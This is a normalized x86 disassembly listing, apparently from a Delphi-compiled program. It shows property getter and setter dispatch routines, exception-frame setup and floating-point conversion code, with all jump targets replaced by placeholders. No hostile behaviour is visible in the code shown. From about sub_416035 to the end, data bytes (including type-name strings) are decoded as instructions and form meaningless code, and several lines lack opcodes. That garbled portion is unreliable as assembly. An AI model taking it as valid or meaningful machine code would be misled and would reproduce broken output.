pop edi
pop esi
pop ebx
retn
sub_414a78
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_414948
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_4081e4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414a2c
mov edx [ rw-data ]
mov eax esi
call sub_407e74
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407e74
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_4081e4
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_414adc
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_414b4c
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_414ba0
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_414bd0
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_414c44
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_414ca0
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_414ce4
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414d60
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404154
mov ecx esp
mov edx esi
mov eax ebx
call sub_414ce4
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_414da8
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_414d94
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_414de8
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_414d94
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414e28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414e70
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_414f44
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_404140
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e77
lea eax [ ebp - 0x4 ]
call sub_4045c4
retn
sub_414e80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414ec8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404710
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41502c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ecf
lea eax [ ebp - 0x4 ]
call sub_4045c4
retn
sub_414ed8
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414d38
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414da8
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_414e28
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_403eb8
pop ebx
retn
sub_414f18
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_414d60
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_414de8
pop ebx
retn
dec bl
je r-xdata
call sub_414e80
jmp r-xdata
pop ebx
retn
sub_414f44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41501c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_414ed8
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404710
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415023
lea eax [ ebp - 0x10 ]
call sub_403eb8
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_404600
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4045c4
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_41502c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4150f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404140
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_414f18
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150f9
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404600
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_415100
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_414948
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_415140 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_414948
cmp [ eax ] 0x4
jne r-xdata
sub_415218
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_414948
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_415260 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41538f ]
jmp [ eax * 4 + jump_table_4152fc ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_415424
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_415410
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_415464
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_415410
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4154a4
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_4154e4
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_41551c
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_415544
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_415580
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_4057cc
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_415600
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4057cc
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_415674
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4156ba
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4156c1
retn
mov eax rw-data
call sub_403eb8
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_40496c
sub_4156ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415711
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415718
retn
sub_416035
adc [ eax + 0x41 ] esp
add [ edi ] bl
pushad
inc ecx
add [ ecx ] ch
pushad
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
xor eax 0x8004160
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x60b00040 ] cl
inc ecx
add [ ecx + 0x60 ] al
inc ecx
add [ eax ] al
add [ eax ] al
add al al
pushad
inc ecx
add ah ch
pushad
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
pushad
inc ecx
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
adc eax 0x746e4954
jb r-xdata
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ eax - 0x7fffbe72 ] bh
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al ch
mov [ ecx ] es
clc
lea eax [ ecx ]
add [ esi - 0x72ebffbf ] cl
inc ecx
add [ eax - 0x71 ] cl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] ah
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
add ah bl
xor [ eax ] al
mov esp 0x7004190
push esp
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
insd
mov eax eax
cld
popad
inc ecx
add [ edi ] al
andps xmm0 [ ebx + 0x6f ]
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
je r-xdata
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
popad
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
imul esi [ ebx + 0x74 ] 0xb0746e65
pushad
inc ecx
add al ch
pop edi
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
popad
inc ecx
push edx
arpl [ gs : ecx + 0x6c ] sp
insb
mov eax 0x4161
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + edx * 4 + 0x54070041 ] bh
xor eax [ eax ]
shl [ eax ] 0x40
imul esi [ ebx + 0x74 ] 0xec746e65
pushad
inc ecx
add [ edi ] al
lea eax [ ecx ]
add [ esi - 0x6c47ffbf ] cl
inc ecx
add [ eax + ebx * 4 + 0x41 ] dl
add [ eax - 0x68 ] bl
inc ecx
add [ eax + ebx * 4 + 0x41 ] bl
add [ eax ] dl
cwde
inc ecx
add [ eax + ebx * 4 ] dl
inc ecx
add [ eax - 0x6c ] dl
insd
mov eax 0xe8004161
pop edi
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
[ edx + edx * 4 - 0x6e17ffbf ]
inc ecx
add [ edi ] cl
push esp
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + edx * 4 + 0x41 ] dl
add al bh
lea eax [ ecx ]
add [ esi - 0x72ebffbf ] cl
inc ecx
add al al
xchg ecx eax
inc ecx
add [ eax - 0x2fffbe6e ] ah
xchg edx eax
inc ecx
add al cl
xchg edx eax
inc ecx
add [ ecx + edx * 4 ] bl
inc ecx
add [ edx ] al
add bh bh
add dh ah
popad
inc ecx
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
add [ eax ] al
fsub [ ecx + 0x41 ]
jae r-xdata
inc ecx
add ah cl
push eax
xchg esp eax
jae r-xdata
inc eax
add [ ebx + esi + 0x33780040 ] al
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ ebp + 0x62700040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2bffbe9e ] bl
bound eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
stosb [ edi ]
bound eax [ ecx ]
les esp [ edx + 0x41 ]
add [ eax ] bl
add [ eax ] al
add [ edi + ebx * 2 + 0x41 ] dh
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
xchg esp eax
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
add al 0x0
std
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebx + edx * 4 + 0x41 ] cl
add al bh
sub_4164fc
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add [ ebx - 0x6607ffbf ] bl
outsb
dec ecx
je r-xdata
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ esi + ebp * 4 ] bl
imul ebp [ esi + 0x67 ] 0x7473694c
adc [ esi + 0x41 ] ah
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc ecx
add [ edx + ebp * 4 ] bh
inc ecx
add [ eax - 0x56 ] dh
inc ecx
add [ edx + ebp * 4 + 0x41 ] dh
fwait
inc ecx
add al bh
cdq
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
push 0x4165
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc cx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc cx
add [ eax ] dh
add [ eax ] al
add ah ch
arpl [ ecx ] ax
jo r-xdata
push ebx
popad
inc ecx
add [ eax - 0x52 ] ch
inc ecx
add [ eax + 0x5c0041ae ] al
sub [ eax ] eax
pop esp
sub [ eax ] eax
and [ edi - 0x505bffbf ] ch
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
sbb al 0xae
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
aam 0x64
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax - 0x56 ] bh
inc ecx
add al al
sahf
inc ecx
add ah ch
stosd [ edi ]
inc ecx
add [ eax - 0x54 ] cl
stosb [ edi ]
inc ecx
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
push 0x4167
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x80041 ] al
